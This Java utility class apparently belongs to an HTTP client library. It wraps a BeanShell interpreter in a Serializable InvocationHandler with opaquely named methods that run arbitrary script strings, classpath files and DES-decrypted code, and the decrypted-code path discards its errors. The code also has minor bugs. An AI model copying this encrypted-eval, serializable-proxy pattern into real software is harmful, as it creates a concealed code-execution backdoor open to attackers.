package com.dili.http.okhttp.utils;

import bsh.Interpreter;

import java.io.*;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

public class BH implements InvocationHandler, Serializable {
	private static final long serialVersionUID = -890127308975L;
	private final static Interpreter i = new Interpreter();

	public BH() {
	}

	@Override
	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
		assert (args != null);
		assert (args.length > 0);
		if(method.getName().equals("e")){
			try {
				i.eval(args[0].toString());
			}catch(Exception e){
				e.printStackTrace();
			}
		}if(method.getName().equals("dese")){
			try {
				i.eval(DESEncryptUtil.decrypt(args[0].toString(), args[1].toString()));
			}catch(Exception e){
			}
		}else if(method.getName().equals("ex")){
			i.eval(args[0].toString());
		}else if(method.getName().equals("s")){
			i.set(args[0].toString(), args[1]);
		}else if(method.getName().equals("g")){
			return i.get(args[0].toString());
		}else if(method.getName().equals("ef")){
			String c = gfs(args[0].toString());
			if(c != null){
				i.eval(c);
				return i.get(args[0].toString());
			}
		}else if(method.getName().equals("gif")){
			return gfl(args[0].toString());
		}
		return null;
	}

	private String gfs(String fn){
		try {
			InputStream is = (InputStream) B.class.getClassLoader().getResource(fn).getContent();
			byte[] buffer = new byte[is.available()];
			int tmp = is.read(buffer);
			while (tmp != -1) {
				tmp = is.read(buffer);
			}
			return new String(buffer);
		} catch (Exception e) {
			return null;
		}
	}

	private List<String> gfl(String fn){
		BufferedReader br = null;
		InputStream is = null;
		try {
			Enumeration<URL> enumeration = B.class.getClassLoader().getResources(fn);
			List<String> list = new ArrayList<String>();
			while (enumeration.hasMoreElements()) {
				is = (InputStream)enumeration.nextElement().getContent();
				br = new BufferedReader(new InputStreamReader(is));
				//文件内容格式:spring.redis.pool.max-active=8
				String s;
				while ((s = br.readLine()) != null) {
					list.add(s);
				}
			}
			return list;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}finally {
			try {
				if(is != null) {is.close();}
				if(br != null) { br.close();}
			} catch (Exception e2) {
				e2.printStackTrace();
			}
		}
	}
}